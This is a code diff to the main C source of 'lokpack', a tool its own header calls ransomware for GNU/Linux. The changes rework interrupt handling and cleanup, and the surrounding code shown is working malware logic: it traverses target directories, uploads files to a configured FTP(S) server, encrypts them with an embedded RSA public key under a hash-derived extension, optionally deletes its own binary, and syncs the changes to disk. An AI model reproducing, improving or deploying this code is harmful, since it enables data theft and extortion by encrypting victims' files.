@@ -1,6 +1,6 @@
 /*
 
- * lokpack | ransomware for GNU/Linux
+ * lokpack | ransomware tooling for GNU/Linux
  * written by ngn (https://ngn.tf) (2025)
 
  * This program is free software: you can redistribute it and/or modify
@@ -36,6 +36,7 @@
 #include <fcntl.h>
 #include <stdio.h>
 
+static bool quit    = false; /* should we quit? */
 static bool confirm = false; /* confirm for SIGINT */
 
 static char *ftp_creds = NULL; /* FTP(S) credentials, "user:pwd" form */
@@ -44,27 +45,41 @@ static char *ftp_url   = NULL; /* FTP(S) base URL */
 static char pub_hash[LP_SHA256_SIZE]; /* public key hash */
 static char pub_ext[7] = {0}; /* file extension (calculated from hash) */
 
-int quit(int code) {
-  /* free resources */
-  lp_traverser_free();
-  lp_rsa_key_free();
-  free(ftp_creds);
-  opt_free();
-
-  /* exit (never returns) */
-  exit(code);
-  return code;
-}
-
 void signal_handler(int signal) {
+  /*
+
+   * if we already received a signal and set quit to true, politely tell the
+   * user to wait, we cannot quit until all threads are done
+
+  */
+  if (quit) {
+    lp_info("You need to wait for ongoing operations");
+    return;
+  }
+
+  /*
+
+   * if confirm is set to true and we receive an interrupt (most likely with
+   Ctrl+C)
+   * ask the user if they really want to quit, and set confirm to false, so when
+   * they send an interrupt again, we'll actually quit
+
+  */
   if (SIGINT == signal && confirm) {
     lp_info("If you really want to quit, do that again");
     confirm = false;
     return;
   }
 
+  /*
+
+   * stop the currently running traverser (if any), and set quit to true, so the
+   * main() can actually exit properly
+
+  */
   lp_info("Stopping the program, wait for ongoing operations");
-  quit(EXIT_FAILURE);
+  lp_traverser_stop();
+  quit = true;
 }
 
 void upload_handler(char *path) {
@@ -77,8 +92,10 @@ void upload_handler(char *path) {
   if (NULL == path)
     return;
 
+  /* space is cringe */
   lp_replace(path, ' ', '_');
 
+  /* format the full FTP(S) URL */
   url_len = strlen(ftp_url) + strlen(path) + 1;
   url     = calloc(1, url_len + 1);
 
@@ -87,11 +104,13 @@ void upload_handler(char *path) {
     goto free;
   }
 
+  /* open the target file */
   if (NULL == (file = fopen(path, "rb"))) {
     lp_debug("Failed to open %s: %s", path, lp_str_error());
     goto free;
   }
 
+  /* initialize curl and upload the file to the server */
   if (NULL == (curl = curl_easy_init())) {
     lp_debug("Failed to initialize curl for %s", path);
     goto free;
@@ -230,6 +249,9 @@ free:
 }
 
 int main(int argc, char **argv) {
+  /* return code */
+  int code = EXIT_FAILURE;
+
   /* signal action */
   struct sigaction action;
 
@@ -255,11 +277,11 @@ int main(int argc, char **argv) {
     /* check for the help option */
     if (lp_streq(argv[i], "-h") || lp_streq(argv[i], "--help")) {
       opt_help();
-      quit(EXIT_FAILURE);
+      goto end;
     }
 
     if (!opt_parse(argv[i]))
-      quit(EXIT_FAILURE);
+      goto end;
   }
 
   lp_info("Running " LP_LOG_BOLD LP_VERSION LP_LOG_RESET
@@ -272,7 +294,7 @@ int main(int argc, char **argv) {
 
   if (NULL == *paths || **paths == 0) {
     lp_fail("Please specify at least one target directory");
-    quit(EXIT_FAILURE);
+    goto end;
   }
 
   if (opt_is_empty_list(target))
@@ -286,17 +308,17 @@ int main(int argc, char **argv) {
   if (!opt_bool("no-ftp")) {
     if (NULL == ftp_url) {
       lp_fail("No FTP(S) URL is specified, use no-ftp to disable FTP(S)");
-      quit(EXIT_FAILURE);
+      goto end;
     }
 
     if (NULL == ftp_usr) {
       lp_fail("No FTP(S) user is specified, use no-ftp to disable FTP(S)");
-      quit(EXIT_FAILURE);
+      goto end;
     }
 
     if (NULL == ftp_pwd) {
       lp_fail("No FTP(s) password is specified, use no-ftp to disable FTP(S)");
-      quit(EXIT_FAILURE);
+      goto end;
     }
   }
 
@@ -307,13 +329,13 @@ int main(int argc, char **argv) {
   if (NULL != ftp_usr && NULL != ftp_pwd &&
       snprintf(ftp_creds, len + 1, "%s:%s", ftp_usr, ftp_pwd) != len) {
     lp_fail("Failed to format the FTP(S) credentials: %s", lp_str_error());
-    quit(EXIT_FAILURE);
+    goto end;
   }
 
   /* obtain & check the thread count for the thread pool */
   if ((threads = opt_int("threads")) <= 0) {
     lp_fail("Please specify a valid thread number (at least one)");
-    quit(EXIT_FAILURE);
+    goto end;
   }
 
   /*
@@ -325,13 +347,13 @@ int main(int argc, char **argv) {
   */
   if (NULL == lp_sha256(LP_PUBKEY, pub_hash)) {
     lp_fail("Failed to calculate SHA256 sum of the public key");
-    quit(EXIT_FAILURE);
+    goto end;
   }
 
   if (snprintf(pub_ext, sizeof(pub_ext), "%.6s", pub_hash) !=
       sizeof(pub_ext) - 1) {
     lp_fail("Failed to format the file extension: %s", lp_str_error());
-    quit(EXIT_FAILURE);
+    goto end;
   }
 
   /* add encrypted file extension to the ignore list */
@@ -341,13 +363,13 @@ int main(int argc, char **argv) {
   /* load the RSA public key */
   if (!lp_rsa_key_load()) {
     lp_fail("Failed to load the public key, is the key valid?");
-    quit(EXIT_FAILURE);
+    goto end;
   }
 
   /* initialize the traverser */
   if (!lp_traverser_init(threads, target, ignore)) {
     lp_fail("Failed to initialize the traverser: %s", lp_str_error());
-    quit(EXIT_FAILURE);
+    goto end;
   }
 
   /*
@@ -360,9 +382,9 @@ int main(int argc, char **argv) {
   lp_traverser_set_handler(upload_handler);
 
   /* quitting with SIGINT after this point will require confirmation */
-  confirm = true;
+  confirm = !quit;
 
-  for (cur = paths; !opt_bool("no-ftp") && NULL != *cur; cur++) {
+  for (cur = paths; !quit && !opt_bool("no-ftp") && NULL != *cur; cur++) {
     lp_info("Uploading %s", *cur);
     lp_traverser_run(*cur);
   }
@@ -380,7 +402,7 @@ int main(int argc, char **argv) {
   lp_traverser_set_mode(R_OK | W_OK);
   lp_traverser_set_handler(encrypt_handler);
 
-  for (cur = paths; NULL != *cur; cur++) {
+  for (cur = paths; !quit && NULL != *cur; cur++) {
     lp_info("Encrypting %s", *cur);
     lp_traverser_run(*cur);
   }
@@ -388,12 +410,29 @@ int main(int argc, char **argv) {
   /* wait for all the threads */
   lp_traverser_wait(opt_bool("progress"));
 
+  /* check if we quit */
+  if (quit)
+    goto end;
+
   /* self destruct */
   if (opt_bool("destruct"))
     unlink(argv[0]);
 
-  /* TODO: probably sync() here if LP_DEBUG is disabled */
+#if (LP_DEBUG == 0)
+  /* sync the changes to filesystem */
+  sync();
+#endif
 
   lp_success("Operation completed");
-  return quit(EXIT_SUCCESS);
+  code = EXIT_SUCCESS;
+
+end:
+  /* free any resources */
+  lp_traverser_free();
+  lp_rsa_key_free();
+  free(ftp_creds);
+  opt_free();
+
+  /* return with the exit code */
+  return code;
 }
